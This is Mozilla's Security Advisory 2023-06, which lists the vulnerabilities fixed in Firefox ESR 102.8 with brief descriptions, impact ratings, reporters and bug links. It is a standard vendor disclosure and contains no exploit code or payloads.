  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2023-06

## Security Vulnerabilities fixed in Firefox ESR 102.8

Announced
February 14, 2023
Impact
high
Products
Firefox ESR
Fixed in

* Firefox ESR 102.8

#### [#CVE-2023-25728: Content security policy leak in violation reports using iframes](#CVE-2023-25728)

Reporter
Johan Carlsson
Impact
high
##### Description

The `Content-Security-Policy-Report-Only` header could allow an attacker to leak a child iframe's unredacted URI when interaction with that iframe triggers a redirect.

##### References

* [Bug 1790345](https://bugzilla.mozilla.org/show_bug.cgi?id=1790345)

#### [#CVE-2023-25730: Screen hijack via browser fullscreen mode](#CVE-2023-25730)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A background script invoking `requestFullscreen` and then blocking the main thread could force the browser into fullscreen mode indefinitely, resulting in potential user confusion or spoofing attacks.

##### References

* [Bug 1794622](https://bugzilla.mozilla.org/show_bug.cgi?id=1794622)

#### [#CVE-2023-0767: Arbitrary memory write via PKCS 12 in NSS](#CVE-2023-0767)

Reporter
Christian Holler
Impact
high
##### Description

An attacker could construct a PKCS 12 cert bundle in such a way that could allow for arbitrary memory writes via PKCS 12 Safe Bag attributes being mishandled.

##### References

* [Bug 1804640](https://bugzilla.mozilla.org/show_bug.cgi?id=1804640)

#### [#CVE-2023-25735: Potential use-after-free from compartment mismatch in SpiderMonkey](#CVE-2023-25735)

Reporter
Samuel Groß
Impact
high
##### Description

Cross-compartment wrappers wrapping a scripted proxy could have caused objects from other compartments to be stored in the main compartment resulting in a use-after-free after unwrapping the proxy.

##### References

* [Bug 1810711](https://bugzilla.mozilla.org/show_bug.cgi?id=1810711)

#### [#CVE-2023-25737: Invalid downcast in SVGUtils::SetupStrokeGeometry](#CVE-2023-25737)

Reporter
Lukas Bernhard
Impact
high
##### Description

An invalid downcast from `nsTextNode` to `SVGElement` could have lead to undefined behavior.

##### References

* [Bug 1811464](https://bugzilla.mozilla.org/show_bug.cgi?id=1811464)

#### [#CVE-2023-25738: Printing on Windows could potentially crash Firefox with some device drivers](#CVE-2023-25738)

Reporter
Mark
Impact
high
##### Description

Members of the `DEVMODEW` struct set by the printer device driver weren't being validated and could have resulted in invalid values which in turn would cause the browser to attempt out of bounds access to related variables.
*This bug only affects Firefox on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1811852](https://bugzilla.mozilla.org/show_bug.cgi?id=1811852)

#### [#CVE-2023-25739: Use-after-free in mozilla::dom::ScriptLoadContext::~ScriptLoadContext](#CVE-2023-25739)

Reporter
Holger Fuhrmannek
Impact
high
##### Description

Module load requests that failed were not being checked as to whether or not they were cancelled causing a use-after-free in `ScriptLoadContext`.

##### References

* [Bug 1811939](https://bugzilla.mozilla.org/show_bug.cgi?id=1811939)

#### [#CVE-2023-25729: Extensions could have opened external schemes without user knowledge](#CVE-2023-25729)

Reporter
Vitor Torres
Impact
moderate
##### Description

Permission prompts for opening external schemes were only shown for `ContentPrincipals` resulting in extensions being able to open them without user interaction via `ExpandedPrincipals`. This could lead to further malicious actions such as downloading files or interacting with software already installed on the system.

##### References

* [Bug 1792138](https://bugzilla.mozilla.org/show_bug.cgi?id=1792138)

#### [#CVE-2023-25732: Out of bounds memory write from EncodeInputStream](#CVE-2023-25732)

Reporter
Ronald Crane
Impact
moderate
##### Description

When encoding data from an `inputStream` in `xpcom` the size of the input being encoded was not correctly calculated potentially leading to an out of bounds memory write.

##### References

* [Bug 1804564](https://bugzilla.mozilla.org/show_bug.cgi?id=1804564)

#### [#CVE-2023-25734: Opening local .url files could cause unexpected network loads](#CVE-2023-25734)

Reporter
Ameen Basha M K and Shaheen Fazim
Impact
moderate
##### Description

After downloading a Windows `.url` shortcut from the local filesystem, an attacker could supply a remote path that would lead to unexpected network requests from the operating system. This also had the potential to leak NTLM credentials to the resource.
*This bug only affects Firefox on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1809923](https://bugzilla.mozilla.org/show_bug.cgi?id=1809923)
* [Bug 1784451](https://bugzilla.mozilla.org/show_bug.cgi?id=1784451)
* [Bug 1810143](https://bugzilla.mozilla.org/show_bug.cgi?id=1810143)
* [Bug 1812338](https://bugzilla.mozilla.org/show_bug.cgi?id=1812338)

#### [#CVE-2023-25742: Web Crypto ImportKey crashes tab](#CVE-2023-25742)

Reporter
Goras Francesco
Impact
low
##### Description

When importing a SPKI RSA public key as ECDSA P-256, the key would be handled incorrectly causing the tab to crash.

##### References

* [Bug 1813424](https://bugzilla.mozilla.org/show_bug.cgi?id=1813424)

#### [#CVE-2023-25744: Memory safety bugs fixed in Firefox 110 and Firefox ESR 102.8](#CVE-2023-25744)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Kershaw Chang and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 109 and Firefox ESR 102.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 110 and Firefox ESR 102.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1789449%2C1803628%2C1810536)

#### [#CVE-2023-25746: Memory safety bugs fixed in Firefox ESR 102.8](#CVE-2023-25746)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Philipp and Gabriele Svelto reported memory safety bugs present in Firefox ESR 102.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox ESR 102.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1544127%2C1762368)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)


